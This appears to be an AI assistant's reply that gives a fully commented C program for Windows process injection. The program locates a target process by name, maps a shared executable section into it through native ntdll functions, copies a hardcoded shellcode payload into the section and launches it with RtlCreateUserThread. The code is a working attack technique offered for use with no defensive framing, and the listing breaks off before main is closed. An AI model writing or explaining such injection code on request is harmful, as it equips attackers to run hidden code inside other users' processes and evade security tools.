Sure! Here's the commented version of the code block:

```c
#include <stdio.h> // Include the standard input/output library
#include <string.h> // Include the string manipulation library
#include <windows.h> // Include the Windows API library
#include <tlhelp32.h> // Include the tool help library for process enumeration

#define InitializeObjectAttributes(p,n,a,r,s) { \ // Define a macro for initializing object attributes
  (p)->Length = sizeof(OBJECT_ATTRIBUTES); \ // Set the length of the object attributes structure
  (p)->RootDirectory = (r); \ // Set the root directory handle
  (p)->Attributes = (a); \ // Set the attributes of the object
  (p)->ObjectName = (n); \ // Set the name of the object
  (p)->SecurityDescriptor = (s); \ // Set the security descriptor
  (p)->SecurityQualityOfService = NULL; \ // Set the security quality of service
}

typedef struct _LSA_UNICODE_STRING { // Define a structure for a Unicode string
  USHORT            Length; // Length of the string
  USHORT            MaximumLength; // Maximum length of the string
  PWSTR             Buffer; // Pointer to the string buffer
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES { // Define a structure for object attributes
  ULONG            Length; // Length of the structure
  HANDLE           RootDirectory; // Handle to the root directory
  PUNICODE_STRING  ObjectName; // Pointer to the object name
  ULONG            Attributes; // Attributes of the object
  PVOID            SecurityDescriptor; // Security descriptor of the object
  PVOID            SecurityQualityOfService; // Security quality of service
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID { // Define a structure for a client ID
  PVOID            UniqueProcess; // Unique identifier for the process
  PVOID            UniqueThread; // Unique identifier for the thread
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS(NTAPI* pNtCreateSection)( // Define a function pointer type for NtCreateSection
  OUT PHANDLE            SectionHandle,
  IN ULONG               DesiredAccess,
  IN POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
  IN PLARGE_INTEGER      MaximumSize OPTIONAL,
  IN ULONG               PageAttributes,
  IN ULONG               SectionAttributes,
  IN HANDLE              FileHandle OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)( // Define a function pointer type for NtMapViewOfSection
  HANDLE            SectionHandle,
  HANDLE            ProcessHandle,
  PVOID*            BaseAddress,
  ULONG_PTR         ZeroBits,
  SIZE_T            CommitSize,
  PLARGE_INTEGER    SectionOffset,
  PSIZE_T           ViewSize,
  DWORD             InheritDisposition,
  ULONG             AllocationType,
  ULONG             Win32Protect
);

typedef NTSTATUS(NTAPI* pRtlCreateUserThread)( // Define a function pointer type for RtlCreateUserThread
  IN HANDLE               ProcessHandle,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
  IN BOOLEAN              CreateSuspended,
  IN ULONG                StackZeroBits,
  IN OUT PULONG           StackReserved,
  IN OUT PULONG           StackCommit,
  IN PVOID                StartAddress,
  IN PVOID                StartParameter OPTIONAL,
  OUT PHANDLE             ThreadHandle,
  OUT PCLIENT_ID          ClientID
);

typedef NTSTATUS(NTAPI* pNtOpenProcess)( // Define a function pointer type for NtOpenProcess
  PHANDLE                 ProcessHandle,
  ACCESS_MASK             AccessMask,
  POBJECT_ATTRIBUTES      ObjectAttributes,
  PCLIENT_ID              ClientID
);

typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)( // Define a function pointer type for ZwUnmapViewOfSection
  HANDLE                 ProcessHandle,
  PVOID BaseAddress
);

int findMyProc(const char* procname) { // Function to find a process by name
  HANDLE hSnapshot; // Handle to the process snapshot
  PROCESSENTRY32 pe; // Structure for process information
  int pid = 0; // Process ID
  BOOL hResult; // Result of process enumeration

  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Create a snapshot of the running processes
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0; // Return 0 if the snapshot creation fails

  pe.dwSize = sizeof(PROCESSENTRY32); // Set the size of the process entry structure
  hResult = Process32First(hSnapshot, &pe); // Get the first process entry

  while (hResult) { // Loop through all the processes
    if (strcmp(procname, pe.szExeFile) == 0) { // Compare the process name with the target name
      pid = pe.th32ProcessID; // Set the process ID
      break; // Break out of the loop
    }
    hResult = Process32Next(hSnapshot, &pe); // Get the next process entry
  }

  CloseHandle(hSnapshot); // Close the process snapshot handle
  return pid; // Return the process ID
}

int main(int argc, char* argv[]) { // Main function
  unsigned char my_payload[] = // Define a payload as an array of unsigned characters
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
    "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
    "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
    "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x4d\x4d\x53\x2d\x4c\x44\x4f\x2d\x4e\x52\x4d\x2d\x36"
    "\x36\x37\x00\x45\x4b\x49\x50\x00";

  SIZE_T s = 4096; // Set the size of the section
  LARGE_INTEGER sectionS = { s }; // Create a large integer structure for the section size
  HANDLE sh = NULL; // Initialize the section handle to NULL
  PVOID lb = NULL; // Initialize the base address of the local view to NULL
  PVOID rb = NULL; // Initialize the base address of the remote view to NULL
  HANDLE th = NULL; // Initialize the thread handle to NULL
  DWORD pid; // Process ID

  pid = findMyProc(argv[1]); // Find the process ID of the specified process name

  OBJECT_ATTRIBUTES oa; // Declaration of object attributes
CLIENT_ID cid; // Declaration of client ID

InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL); // Initialize object attributes

cid.UniqueProcess = (PVOID)pid; // Set the unique process ID
cid.UniqueThread = 0; // Set the unique thread ID

HMODULE ntdll = GetModuleHandleA("ntdll.dll"); // Get handle to ntdll.dll

// Function pointer declarations
pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
pNtCreateSection myNtCreateSection = (pNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
pNtMapViewOfSection myNtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
pRtlCreateUserThread myRtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(ntdll, "RtlCreateUserThread");
pZwUnmapViewOfSection myZwUnmapViewOfSection = (pZwUnmapViewOfSection)GetProcAddress(ntdll, "ZwUnmapViewOfSection");

myNtCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, &oa, (PLARGE_INTEGER)&sectionS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL); // Create a section object

myNtMapViewOfSection(sh, GetCurrentProcess(), &lb, NULL, NULL, NULL, &s, 2, NULL, PAGE_READWRITE); // Map the section into the parent process

HANDLE ph = NULL; // Handle to the target process
myNtOpenProcess(&ph, PROCESS_ALL_ACCESS, &oa, &cid); // Open the target process

if (!ph) { // Check if opening the process failed
  printf("Failed to open process :(\n");
  return -2;
}

myNtMapViewOfSection(sh, ph, &rb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READ); // Map the section into the target process

memcpy(lb, my_payload, sizeof(my_payload)); // Copy the payload to the mapped section

myRtlCreateUserThread(ph, NULL, FALSE, 0, 0, 0, rb, NULL, &th, NULL); // Create a remote thread in the target process

if (WaitForSingleObject(th, INFINITE) == WAIT_FAILED) { // Wait for the thread to finish executing the payload
  return -2;
}

myZwUnmapViewOfSection(GetCurrentProcess(), lb); // Unmap the section from the parent process
myZwUnmapViewOfSection(ph, rb); // Unmap the section from the target process
CloseHandle(sh); // Close the section handle
